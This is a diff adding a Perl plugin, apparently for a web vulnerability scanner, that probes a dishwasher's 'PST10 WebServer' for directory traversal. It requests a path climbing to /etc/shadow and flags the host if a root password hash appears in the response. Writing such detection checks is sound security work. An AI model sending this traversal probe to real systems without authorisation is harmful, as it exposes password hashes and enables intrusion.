@@ -1,0 +1,25 @@
+
+sub chasernet_dishwasher_init {
+    my $id = { name        => "dishwasher",
+               full_name   => "dishwasher",
+               author      => "Jeremy Bae",
+               description => "Look for the dishwasher directory traversal vulnerability.",
+               hooks       => { scan => { method => \&chasernet_dishwasher, weight => 20 }, },
+               copyright   => "2017 Chris Sullo",
+             };
+
+    return $id;
+}
+
+sub chasernet_dishwasher {
+    my ($mark, $parameters) = @_;
+    my $path = "/../../../../../../../../../../../../etc/shadow";
+
+    my ($res, $content, $error, $request, $response) = nfetch($mark, $path, "GET", "", "", "", "dishwasher");
+
+    if (($response->{'server'} =~ 'PST10 WebServer') && ($content =~ 'root:\$1\$.*')) {
+        add_vulnerability($mark, "$path: Site appears vulnerable to the dishwasher directory traversal vulnerability.", 999951, 0, "GET", $path, $request, $response);
+    }
+}
+
+1;
